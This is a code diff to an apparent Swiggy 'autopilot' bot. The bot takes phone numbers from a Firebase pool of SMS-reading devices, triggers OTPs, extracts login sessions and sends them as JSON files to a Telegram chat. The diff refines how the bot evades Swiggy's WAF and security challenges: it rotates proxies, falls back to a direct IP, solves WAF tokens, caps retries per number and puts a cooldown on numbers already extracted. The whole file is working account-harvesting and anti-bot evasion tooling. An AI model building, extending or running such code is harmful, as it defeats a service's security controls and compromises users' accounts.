@@ -20,7 +20,12 @@
 import { isFirebaseConfigured, firebaseSetupHintLines, listPoolNumbers, scanFreshDevices } from './firebase-numbers.js';
 import { applyActiveSource } from './firebase-sources.js';
 import { getSetting } from './bot-settings.js';
-import { processSingleNumber, freshEntriesFrom, preferOnline, getPremiumLedger } from './number-pipeline.js';
+import {
+  processSingleNumber,
+  freshEntriesFrom,
+  preferOnline,
+  isPhoneBlockedByPremiumLedger,
+} from './number-pipeline.js';
 import { getLiveSwiggyWafToken, setBridgeProxy, getBridgeProxy, getChromeStatus } from './swiggy-bridge.js';
 import * as wafPool from './waf-pool.js';
 import * as proxyPool from './proxy-pool.js';
@@ -54,6 +59,7 @@ const state = {
   freshAfterDelete: 0,
   skipped: 0,
   deferred: 0,
+  cooldownSkips: 0,       // 7-day extracted-number cooldown par roke gaye numbers
   staleSkips: 0,          // last-seen window se bahar wale devices (OTP bheje baghair skip)
   failed: 0,
   aborted: 0,
@@ -82,6 +88,7 @@ const state = {
   scanPass: 1,            // full-pool scan ka pass number
   scanWindowMs: 0,        // current/selected last-seen ladder window
   scanBestActivityMs: 0,  // probed sample ki sabse taazi SMS activity (diagnostic)
+  scanBestActivityAgeMs: 0, // scan ke waqt ki best SMS age (baad me khud na barhti rahe)
   scanFresh: 0,           // hot-queue me ready (fresh) devices
 };
 
@@ -100,6 +107,7 @@ export function getAutopilotSnapshot() {
     freshAfterDelete: state.freshAfterDelete,
     skipped: state.skipped,
     deferred: state.deferred,
+    cooldownSkips: state.cooldownSkips || 0,
     failed: state.failed,
     staleSkips: state.staleSkips || 0,
     aborted: state.aborted,
@@ -125,6 +133,7 @@ export function getAutopilotSnapshot() {
     scanPass: state.scanPass || 1,
     scanWindowMs: state.scanWindowMs || 0,
     scanBestActivityMs: state.scanBestActivityMs || 0,
+    scanBestActivityAgeMs: state.scanBestActivityAgeMs || 0,
     scanFresh: state.scanFresh || 0,
     lastError: state.lastError,
     history: state.history.slice(-40),
@@ -182,6 +191,23 @@ export function securityRouteAction({
   return Number(proxyChallenges) >= 3 ? 'direct_fallback' : 'rotate_proxy';
 }
 
+// Ek security outcome asal me kis route par hua? Sirf outcome ke baad
+// current bridge proxy dekhna kabhi-kabhi gumrah kar deta tha (bridge andar
+// recovery me route badal sakta hai), phir proxy challenges 3 tak gine hi
+// nahi jate thay aur card par 4th challenge par bhi "proxy rotate" aata
+// rehta tha. Process shuru honay wali route episode ko authoritative rakho:
+// direct-fallback episode hi direct hai; baqi proxy-enabled episode proxy.
+export function securityChallengeRouteKind({
+  proxyEnabled = false,
+  routeModeAtStart = 'direct',
+  proxyIdAtStart = '',
+  finalProxyId = '',
+} = {}) {
+  if (!proxyEnabled) return 'direct';
+  if (routeModeAtStart === 'direct-fallback' && !proxyIdAtStart && !finalProxyId) return 'direct';
+  return 'proxy';
+}
+
 // Fresh session bante HI uska JSON chat me bhejo (batch ke end ka wait nahi).
 // ui.sendSession fresh-bot deta hai (document file ke tor par bhejta hai).
 // Fire-and-forget: send fail ho bhi jaye to batch kabhi na ruke.
@@ -218,24 +244,24 @@ function statsLines() {
   return [
     field('Processed', String(state.processed)),
     field('✅ Fresh sessions', `${state.fresh}  (naye: ${state.freshNew} · delete+fresh: ${state.freshAfterDelete})`),
-    field('⚠️ Skipped', `${state.skipped} · deferred: ${state.deferred} · 📴 stale devices: ${state.staleSkips || 0}`),
+    field('⚠️ Skipped', `${state.skipped} · deferred: ${state.deferred} · ⏳ 7-day cooldown: ${state.cooldownSkips || 0} · 📴 stale devices: ${state.staleSkips || 0}`),
     field('× Failed', `${state.failed} · aborted: ${state.aborted} · rate-limit: ${state.rateStrikes}`),
     (state.wafCooldowns || state.wafStrikes || state.proxyRotations)
-      ? field('🛡 WAF', `${state.wafCooldowns} cooldown · challenges: ${state.wafStrikes} · rotations: ${state.proxyRotations} · token-ready: ${pSummary?.tokenReadyCount || 0}`)
+      ? field('🛡 WAF', `${state.wafCooldowns} cooldown · challenges: ${state.wafStrikes} · rotations: ${state.proxyRotations} · token-ready: ${pSummary?.tokenReadyCount || 0} · solve-cooling: ${pSummary?.solveCoolingCount || 0}`)
       : '',
     state.serverErrors
       ? field('↻ Swiggy 5xx', `${state.serverErrors} temporary · numbers failed nahi, retry queue me`)
       : '',
     pSummary?.enabled
       ? field('🔀 Proxy', state.routeMode === 'direct-fallback'
-          ? `DIRECT fallback (Render IP)  ·  pool ${pSummary.enabledCount} ON  ·  rotates: ${state.proxyRotations}`
-          : `${getBridgeProxy()?.label || '—'}  ·  ${pSummary.enabledCount} ON  ·  rotates: ${state.proxyRotations}`)
+          ? `DIRECT fallback (Render IP)  ·  pool ${pSummary.usableCount ?? pSummary.enabledCount}/${pSummary.enabledCount} usable · cooling ${pSummary.wafCoolingCount || 0}  ·  rotates: ${state.proxyRotations}`
+          : `${getBridgeProxy()?.label || '—'}  ·  ${pSummary.usableCount ?? pSummary.enabledCount}/${pSummary.enabledCount} usable · cooling ${pSummary.wafCoolingCount || 0}  ·  rotates: ${state.proxyRotations}`)
       : field('🔀 Proxy', 'OFF (ek hi IP — ⚙️ Settings me add karo)'),
     field('Pool', state.poolTotal
       ? `${state.poolFresh} fresh / ${state.poolTotal} numbers`
       : 'load ho raha hai…'),
     (state.scanning || state.scanChecked)
-      ? field('🔎 Device scan', `pass ${state.scanPass || 1}: ${state.scanUniqueChecked || 0}/${state.scanTotalDevices || 0} unique check · total probes ${state.scanTotalProbes || state.scanChecked || 0} · window ≤${fmtDuration(state.scanWindowMs || 0)} · ${state.scanBestActivityMs ? `best SMS ~${fmtDuration(Date.now() - state.scanBestActivityMs)} purani · ` : ''}${state.scanFresh || 0} fresh ready${state.scanning ? ' · scanning…' : ''}`)
+      ? field('🔎 Device scan', `pass ${state.scanPass || 1}: ${state.scanUniqueChecked || 0}/${state.scanTotalDevices || 0} unique check · total probes ${state.scanTotalProbes || state.scanChecked || 0} · window ≤${fmtDuration(state.scanWindowMs || 0)} · ${state.scanBestActivityMs ? `scan ke waqt best SMS ~${fmtDuration(state.scanBestActivityAgeMs || Math.max(0, Date.now() - state.scanBestActivityMs))} purani · ` : ''}${state.scanFresh || 0} fresh ready${state.scanning ? ' · scanning…' : ''}`)
       : '',
     state.current
       ? `📍 <b>Abhi:</b> <code>${esc(state.current.phone)}</code> (${fmtDuration(Date.now() - state.current.startedAt)})`
@@ -386,7 +412,7 @@ export async function startAutopilot(opts = {}) {
     startedAt: Date.now(), finishedAt: 0,
     target, maxMinutes, gapMs, backoffMs,
     processed: 0, fresh: 0, freshNew: 0, freshAfterDelete: 0,
-    skipped: 0, deferred: 0, staleSkips: 0, failed: 0, aborted: 0,
+    skipped: 0, deferred: 0, cooldownSkips: 0, staleSkips: 0, failed: 0, aborted: 0,
     rateStrikes: 0, wafStrikes: 0, wafCooldowns: 0, serverErrors: 0, transientStrikes: 0,
     consecutiveFails: 0, proxyRotations: 0,
     routeMode: 'direct', proxyChallenges: 0, directChallenges: 0,
@@ -394,7 +420,7 @@ export async function startAutopilot(opts = {}) {
     poolTotal: 0, poolFresh: 0,
     scanning: false, scanChecked: 0, scanTotalProbes: 0,
     scanUniqueChecked: 0, scanTotalDevices: 0, scanPass: 1,
-    scanWindowMs: Number(otpCfg.activeWindowMs) || 0, scanBestActivityMs: 0, scanFresh: 0,
+    scanWindowMs: Number(otpCfg.activeWindowMs) || 0, scanBestActivityMs: 0, scanBestActivityAgeMs: 0, scanFresh: 0,
   });
 
   const userId = opts.userId || 'autopilot';
@@ -404,6 +430,13 @@ export async function startAutopilot(opts = {}) {
     // WAF cooldown = number bilkul untouched (sirf wait hui) — count me mat lo,
     // warna summary jhootha dikhega.
     if (res.kind === 'waf_cooldown') return 'waf_cooldown';
+
+    // 7-day extracted-number cooldown — number pehle hi extract/send ho
+    // chuka hai. OTP gaya hi nahi, isliye processed/failed me mat gino.
+    if (res.kind === 'deferred_number_cooldown') {
+      state.cooldownSkips = (state.cooldownSkips || 0) + 1;
+      return 'number_cooldown';
+    }
 
     // Device stale (last-seen window se bahar) — OTP gaya hi nahi, isliye
     // na processed, na fail. Sirf counter (card par dikhe kitne mare hue
@@ -609,6 +642,12 @@ export async function startAutopilot(opts = {}) {
       retryLater.push({ entry, attempts: 0, why });
       console.log(`[Autopilot] Deferred (${why}): ${entry.phone} — will retry in this run.`);
     };
+    const removeRetryLaterPhone = (phone) => {
+      if (!phone) return;
+      for (let i = retryLater.length - 1; i >= 0; i--) {
+        if (retryLater[i]?.entry?.phone === phone) retryLater.splice(i, 1);
+      }
+    };
 
     await poolPromise; // pool ready — warm-up abhi bhi background me ho sakta hai
     if (!pool.length && state.lastError) throw new Error(state.lastError); // Firebase error ko fatal hi rakho (pehle wala behavior)
@@ -634,6 +673,27 @@ export async function startAutopilot(opts = {}) {
     // OTP request baar-baar thok kar per-number limit nahi jalani.
     const transientAttemptsThisRun = new Map(); // phone → count
     const underTransientCap = (e) => (transientAttemptsThisRun.get(e.phone) || 0) < 2;
+    // Is run me extract/send ho chuke numbers — ledger ke ilawa in-memory
+    // hard stop, taaki koi purani hot/retry queue entry inhe dobara na uthaye.
+    const extractedThisRun = new Set();
+    // WAF/security/rate-limit/transient jaise infra outcomes par bhi ek hi
+    // number ko is run me max 2 attempts. Pehle har category ka alag (ya
+    // bilkul nahi) cap tha, isliye ek number WAF storm me baar-baar ghoom
+    // sakta tha aur throughput usi par jal jati thi.
+    const infraAttemptsThisRun = new Map(); // phone → count
+    const infraCappedThisRun = new Set();
+    const underInfraCap = (e) => !infraCappedThisRun.has(e.phone);
+    const recordInfraAttempt = (phone) => {
+      if (!phone) return { attempt: 0, willRetry: false };
+      const attempt = (infraAttemptsThisRun.get(phone) || 0) + 1;
+      infraAttemptsThisRun.set(phone, attempt);
+      const willRetry = attempt < 2;
+      if (!willRetry) {
+        infraCappedThisRun.add(phone);
+        removeRetryLaterPhone(phone);
+      }
+      return { attempt, willRetry };
+    };
     // Isi run me jo devices last-seen gate par stale nikle — dobara-dobara
     // unhi ko probe na karo. "Fresh device ka wait" round me clear hota hai
     // (device beech me zinda ho sakta hai).
@@ -643,6 +703,8 @@ export async function startAutopilot(opts = {}) {
       let list = preferOnline(freshEntriesFrom(pool))
         .filter(underFailCap)
         .filter(underTransientCap)
+        .filter(underInfraCap)
+        .filter((e) => !extractedThisRun.has(e.phone))
         .filter((e) => !staleThisRun.has(e.phone));
       if (!allowOffline) {
         const onlineOnly = list.filter((e) => e.online !== false);
@@ -664,9 +726,46 @@ export async function startAutopilot(opts = {}) {
       while (hotQueue.length) {
         const h = hotQueue.shift();
         state.scanFresh = hotQueue.length;
-        if (staleThisRun.has(h.entry.phone) || !underFailCap(h.entry) || !underTransientCap(h.entry)) continue;
-        if (getPremiumLedger()[h.entry.phone]) continue;
+        if (
+          staleThisRun.has(h.entry.phone) ||
+          extractedThisRun.has(h.entry.phone) ||
+          !underFailCap(h.entry) ||
+          !underTransientCap(h.entry) ||
+          !underInfraCap(h.entry)
+        ) continue;
+        // Sirf "ledger me entry hai" kafi nahi: success 7 din baad eligible
+        // hai, aur 7 din ke andar saved-session fallback bhi block karta hai.
+        if (isPhoneBlockedByPremiumLedger(h.entry.phone)) continue;
         return h;
+      }
+      return null;
+    };
+    const purgeQueuedPhone = (phone) => {
+      if (!phone) return;
+      removeRetryLaterPhone(phone);
+      for (let i = hotQueue.length - 1; i >= 0; i--) {
+        if (hotQueue[i]?.entry?.phone === phone) hotQueue.splice(i, 1);
+      }
+      state.scanFresh = hotQueue.length;
+    };
+    // Retry queue se direct shift karna purana repeat-bug tha: ek number
+    // pehle WAF par defer hua, phir hot queue se process hokar JSON ban
+    // gaya, aur baad me uski purani retry entry use dobara utha leti thi.
+    // Ab retry pick par wohi saare gates dobara check hotay hain.
+    const takeRetryLater = () => {
+      while (retryLater.length) {
+        const r = retryLater.shift();
+        const entry = r?.entry;
+        if (!entry?.phone) continue;
+        if (
+          staleThisRun.has(entry.phone) ||
+          extractedThisRun.has(entry.phone) ||
+          !underFailCap(entry) ||
+          !underTransientCap(entry) ||
+          !underInfraCap(entry) ||
+          isPhoneBlockedByPremiumLedger(entry.phone)
+        ) continue;
+        return { entry, lastActivityMs: 0, windowMs: Number(otpCfg.activeWindowMs) || 0 };
       }
       return null;
     };
@@ -682,6 +781,7 @@ export async function startAutopilot(opts = {}) {
       state.scanUniqueChecked = baseUniqueChecked;
       state.scanWindowMs = Number(otpCfg.activeWindowMs) || 0;
       state.scanBestActivityMs = 0;
+      state.scanBestActivityAgeMs = 0;
       let lastPushAt = 0;
       try {
         const r = await scanFreshDevices(candidates, {
@@ -722,6 +822,9 @@ export async function startAutopilot(opts = {}) {
             state.scanBestActivityMs = Number(bestLastActivityMs) || 0;
             state.scanFresh = hotQueue.length + freshCount;
             const now = Date.now();
+            state.scanBestActivityAgeMs = state.scanBestActivityMs
+              ? Math.max(0, now - state.scanBestActivityMs)
+              : 0;
             if (now - lastPushAt >= 4000) {
               lastPushAt = now;
               const bestLine = state.scanBestActivityMs
@@ -756,6 +859,9 @@ export async function startAutopilot(opts = {}) {
         state.scanUniqueChecked = [...probedDevices].filter((id) => passDeviceIds.has(id)).length;
         state.scanWindowMs = Number(r.fresh?.[0]?.windowMs) || Number(r.widestWindowMs) || Number(otpCfg.activeWindowMs) || 0;
         state.scanBestActivityMs = Number(r.bestLastActivityMs) || Number(r.fresh?.[0]?.lastActivityMs) || 0;
+        state.scanBestActivityAgeMs = state.scanBestActivityMs
+          ? Math.max(0, at - state.scanBestActivityMs)
+          : 0;
         state.scanFresh = hotQueue.length;
         if (r.onlineFallback && r.fresh.length) {
           console.log(`[Autopilot] Scan: quick-scan me usable taaza SMS timestamp nahi mila — Firebase clients ONLINE device process hoga (checked ${r.checked}/${passDeviceIds.size}, timedOut=${Boolean(r.scanTimedOut)}).`);
@@ -799,10 +905,9 @@ export async function startAutopilot(opts = {}) {
           if (picked || state.stopRequested || scan?.exhausted || !(Number(scan?.checked) > 0)) break;
         }
         if (state.stopRequested) { endReason = state.stopReason || 'manual'; break; }
+        if (!picked) picked = takeRetryLater();
         if (!picked) {
-          if (retryLater.length) {
-            picked = { entry: retryLater.shift().entry };
-          } else {
+          {
             await refreshIfStale();
             state.poolFresh = freshEntriesFrom(pool).length;
             // Abhi koi device taazi activity nahi dikha raha — batch band
@@ -823,6 +928,7 @@ export async function startAutopilot(opts = {}) {
               state.scanUniqueChecked = 0;
               state.scanWindowMs = Number(otpCfg.activeWindowMs) || 0;
               state.scanBestActivityMs = 0;
+              state.scanBestActivityAgeMs = 0;
               continue;
             }
             endReason = 'pool-exhausted';
@@ -835,8 +941,9 @@ export async function startAutopilot(opts = {}) {
         // Gate OFF (window=0) — purana random pick, backward compatible
         let fresh = pickFreshList();
         if (!fresh.length) {
-          if (retryLater.length) {
-            fresh = [retryLater.shift().entry];
+          const retryPick = takeRetryLater();
+          if (retryPick) {
+            fresh = [retryPick.entry];
           } else {
             await refreshIfStale();
             fresh = pickFreshList();
@@ -850,6 +957,9 @@ export async function startAutopilot(opts = {}) {
       if (picked.lastActivityMs || picked.onlineFallback) freshWaitRounds = 0;
 
       const entry = picked.entry;
+      // Kisi bhi rasty se pick ho, isi phone ki purani retry entry saaf —
+      // warna success ke baad wahi stale retry number ko dobara utha sakti thi.
+      removeRetryLaterPhone(entry.phone);
       state.current = { phone: entry.phone, startedAt: Date.now() };
 
       // Card par foran saaf dikhao ke scan ruk chuka hai aur asal number
@@ -888,6 +998,13 @@ export async function startAutopilot(opts = {}) {
             }
           : otpCfg;
 
+      // Security outcome ki route classification ke liye process shuru
+      // honay wali asal route episode yaad rakho (bridge andar recovery
+      // me IP badal sakta hai; sirf final proxy dekhna kaafi nahi).
+      const routeAtProcessStart = {
+        mode: state.routeMode || 'direct',
+        proxyId: getBridgeProxyId(),
+      };
       const res = await processSingleNumber({
         userId,
         entry,
@@ -898,6 +1015,10 @@ export async function startAutopilot(opts = {}) {
 
       state.current = null;
       const outcome = tally(res);
+      if (res.ok && res.phone) {
+        extractedThisRun.add(res.phone);
+        purgeQueuedPhone(res.phone);
+      }
       if (outcome === 'failed' && res.phone) {
         failedAttemptsThisRun.set(res.phone, (failedAttemptsThisRun.get(res.phone) || 0) + 1);
       }
@@ -908,7 +1029,7 @@ export async function startAutopilot(opts = {}) {
       }
       // Stale devices rapid-fire skip hote hain — har ek par card edit karne
       // se Telegram flood hoga. Unka count stats me dikhta hai, card nahi.
-      if (outcome !== 'device_stale') {
+      if (outcome !== 'device_stale' && outcome !== 'number_cooldown') {
         await push(progressCard(
           section(
             res.ok
@@ -932,6 +1053,16 @@ export async function startAutopilot(opts = {}) {
       //   rate-limit/WAF → TURANT proxy badal (nayi IP) + number defer kar
       //   (baad me isi run me dobara). Sirf tab ruk jab saare proxies side par.
 
+      // 7-day cooldown — ye number pehle extract/send ho chuka hai. Queue
+      // ki iski har copy saaf karke bina gap agla number lo.
+      if (outcome === 'number_cooldown') {
+        if (res.phone) {
+          extractedThisRun.add(res.phone);
+          purgeQueuedPhone(res.phone);
+        }
+        continue;
+      }
+
       // Device stale — OTP gaya hi nahi. Is run me is number ko dobara mat
       // uthao, bina gap ke turant agla fresh device dhoondho.
       if (outcome === 'device_stale') {
@@ -947,7 +1078,8 @@ export async function startAutopilot(opts = {}) {
       if (outcome === 'swiggy_transient') {
         const attempt = (transientAttemptsThisRun.get(res.phone) || 0) + 1;
         if (res.phone) transientAttemptsThisRun.set(res.phone, attempt);
-        const willRetry = Boolean(res.phone && attempt < 2);
+        const infra = recordInfraAttempt(res.phone);
+        const willRetry = Boolean(res.phone && attempt < 2 && infra.willRetry);
         if (willRetry) deferNumber(entry, 'swiggy_transient');
 
         let next = null;
@@ -984,8 +1116,10 @@ export async function startAutopilot(opts = {}) {
       if (outcome === 'rate_limited') {
         // NOTE: rateStrikes tally() me already badhta hai — yahan dobara ++
         // karne se 3-strike wali limit 2 hits par hi band ho jati thi.
-        // Number defer — isi run me aakhir me dobara try hoga
-        if (res.phone) deferNumber(entry, 'rate_limited');
+        // Number defer — isi run me aakhir me dobara try hoga (is run ke
+        // combined infra attempts max 2; us ke baad ye phone side par).
+        const rateInfra = recordInfraAttempt(res.phone);
+        if (res.phone && rateInfra.willRetry) deferNumber(entry, 'rate_limited');
 
         if (ps.enabled) {
           const before = getBridgeProxyId();
@@ -993,7 +1127,9 @@ export async function startAutopilot(opts = {}) {
           if (next) {
             await push(progressCard(section('🔀 Rate Limit — Proxy Rotate (zero wait)', [
               `› IP ko limit lagi — nayi IP (proxy) le liya: <code>${esc(next.label)}</code>`,
-              `› Number defer kiya — baad me isi run me dobara.`,
+              rateInfra.willRetry
+                ? `› Number defer kiya — baad me isi run me ek aur mauqa milega.`
+                : `› Is number ke is run ke 2 infra attempts ho gaye — ab ye is run me dobara nahi uthega.`,
               `› Strike ${state.rateStrikes} — batch nahi rukega.`,
             ].join('\n'))), stopRows());
             state.consecutiveFails = 0;
@@ -1021,14 +1157,17 @@ export async function startAutopilot(opts = {}) {
       if (outcome === 'waf_cooldown') {
         state.wafCooldowns++;
         if (state.wafCooldowns > 60) { endReason = 'waf_stuck'; break; }
-        if (res.phone) deferNumber(entry, 'waf_cooldown');
+        const wafInfra = recordInfraAttempt(res.phone);
+        if (res.phone && wafInfra.willRetry) deferNumber(entry, 'waf_cooldown');
 
         // Pool ke cooldown ka ahtaram karo lekin ek saath max 5 min — uske
         // baad token naya solve karke phir dekho (IP beech me thandi hogi).
         const cdMs = Math.min(Number(res.cooldownMs) || 120_000, 5 * 60_000);
         await push(progressCard(section('🛡 WAF Cooling — Short Wait', [
           `› Swiggy ki WAF abhi IP ko thanda hone de rahi hai — ~${Math.max(1, Math.round(cdMs / 60000))} min ruk kar aage badhunga.`,
-          `› Number defer ho chuka hai (isi run me dobara ayega). Batch zinda hai.`,
+          wafInfra.willRetry
+            ? `› Number defer ho chuka hai (isi run me ek aur mauqa milega). Batch zinda hai.`
+            : `› Is number ke is run ke 2 infra attempts ho gaye — ab ye is run me dobara nahi uthega. Batch zinda hai.`,
           sub('Proxies add karoge to ye wait ghat kar seconds me aa jayegi (nayi IP = turant aage).'),
         ].join('\n'))), stopRows());
         await sleep(cdMs, () => state.stopRequested);
@@ -1054,29 +1193,42 @@ export async function startAutopilot(opts = {}) {
       if (outcome === 'security_challenge') {
         state.wafStrikes++;
         state.lastError = `security challenge ×${state.wafStrikes}`;
-        if (res.phone) deferNumber(entry, 'security_challenge');
+        const securityInfra = recordInfraAttempt(res.phone);
+        if (res.phone && securityInfra.willRetry) deferNumber(entry, 'security_challenge');
+        const numberRetryLine = securityInfra.willRetry
+          ? 'Number defer hai — isi run me ek aur mauqa milega, failed mark nahi hua.'
+          : 'Is number ke is run ke 2 infra attempts ho gaye — failed mark nahi hua, lekin ab ye is run me dobara nahi uthega.';
         if (state.wafStrikes >= 12) { endReason = 'security_challenge'; break; }
 
-        const currentId = getBridgeProxyId();
-        // Bridge khud bhi andar recovery me IP badal sakta hai — routeMode
-        // ko asal current bridge route se sync rakho, andaza mat lagao.
-        state.routeMode = currentId ? 'proxy' : (ps.enabled ? 'direct-fallback' : 'direct');
-        if (currentId) {
+        const finalProxyId = getBridgeProxyId();
+        const routeKind = securityChallengeRouteKind({
+          proxyEnabled: Boolean(ps.enabled),
+          routeModeAtStart: routeAtProcessStart.mode,
+          proxyIdAtStart: routeAtProcessStart.proxyId,
+          finalProxyId,
+        });
+        const currentId = finalProxyId || (routeKind === 'proxy' ? routeAtProcessStart.proxyId : '');
+        state.routeMode = routeKind === 'proxy'
+          ? 'proxy'
+          : (ps.enabled ? 'direct-fallback' : 'direct');
+        if (routeKind === 'proxy') {
           state.proxyChallenges = (state.proxyChallenges || 0) + 1;
           // Final challenged route ki quarantine guarantee (bridge ke kuch
           // paths pehle ye miss kar dete the). Bridge ne already cooldown
           // laga diya ho to double-count na karo.
-          try {
-            const info = proxyPool.listProxies().find((p) => p.id === currentId);
-            if (!info || !info.cooldownLeftMs) proxyPool.markProxyWafHit(currentId, 10 * 60_000);
-          } catch {}
+          if (currentId) {
+            try {
+              const info = proxyPool.listProxies().find((p) => p.id === currentId);
+              if (!info || !info.cooldownLeftMs) proxyPool.markProxyWafHit(currentId, 10 * 60_000);
+            } catch {}
+          }
         } else {
           state.directChallenges = (state.directChallenges || 0) + 1;
         }
 
         const action = securityRouteAction({
           proxyEnabled: Boolean(ps.enabled),
-          usingDirectFallback: state.routeMode === 'direct-fallback',
+          usingDirectFallback: routeKind === 'direct' && Boolean(ps.enabled),
           proxyChallenges: state.proxyChallenges || 0,
           directChallenges: state.directChallenges || 0,
         });
@@ -1096,7 +1248,7 @@ export async function startAutopilot(opts = {}) {
           await push(progressCard(section('🌐 Proxies Garam — Direct IP Try', [
             `› Challenge mila (lagatar ${state.wafStrikes}). ${reasonLine}`,
             `› Ab Render ki <b>direct IP</b> + usi IP ka fresh WAF token try hoga (route switch #${state.proxyRotations}).`,
-            `› Number defer hai — failed mark nahi hua. Direct par response milte hi challenge storm reset ho jayegi.`,
+            `› ${numberRetryLine} Direct par response milte hi challenge storm reset ho jayegi.`,
             sub('Peeche nayi free proxies bhi parkh raha hoon.'),
           ].join('\n'))), stopRows());
           try { await getLiveSwiggyWafToken(false, { solveBudgetMs: 25_000 }); } catch {}
@@ -1116,7 +1268,7 @@ export async function startAutopilot(opts = {}) {
             await push(progressCard(section('🔀 Direct Bhi Garam — Best Proxy Wapas', [
               `› Direct IP par 2 challenges aaye — best available proxy le liya: <code>${esc(next.label)}</code>`,
               `› Picker ab fresh-token/Indian/clean route ko pehle rakhta hai (rotation #${state.proxyRotations}).`,
-              `› Number defer hai, failed nahi.`,
+              `› ${numberRetryLine}`,
             ].join('\n'))), stopRows());
             try { await getLiveSwiggyWafToken(false, { solveBudgetMs: 25_000 }); } catch {}
             state.consecutiveFails = 0;
@@ -1128,7 +1280,7 @@ export async function startAutopilot(opts = {}) {
           if (next) {
             await push(progressCard(section('🔀 Security Challenge — Proxy Rotate', [
               `› Challenge mila (lagatar ${state.wafStrikes}) — nayi IP: <code>${esc(next.label)}</code> (rotation #${state.proxyRotations})`,
-              `› Number defer kiya — nayi IP + naye token ke saath aage badh raha hoon.`,
+              `› ${numberRetryLine} Nayi IP + naye token ke saath aage badh raha hoon.`,
               sub('Batch nahi rukega. 3 proxy challenges ke baad direct fallback bhi try hoga.'),
             ].join('\n'))), stopRows());
             try { await getLiveSwiggyWafToken(false, { solveBudgetMs: 25_000 }); } catch {}
@@ -1150,7 +1302,7 @@ export async function startAutopilot(opts = {}) {
         const waitMs = wafChallengeWaitMs(state.wafStrikes, poolCd);
         await push(progressCard(section('🛡 Swiggy Security Check — IP Cool-Down', [
           `› Challenge mila (lagatar ${state.wafStrikes}) — direct IP abhi garam hai.`,
-          `› ~${Math.max(1, Math.round(waitMs / 60000))} min ruk kar naya WAF token banao-ga, phir aage. Number defer ho gaya (baad me dobara).`,
+          `› ~${Math.max(1, Math.round(waitMs / 60000))} min ruk kar naya WAF token banao-ga, phir aage. ${numberRetryLine}`,
           sub(ps.enabled
             ? 'Ek aur direct challenge par best proxy route dobara try hogi.'
             : 'Batch nahi rukega. Ek success milte hi ye ginti reset ho jati hai.'),
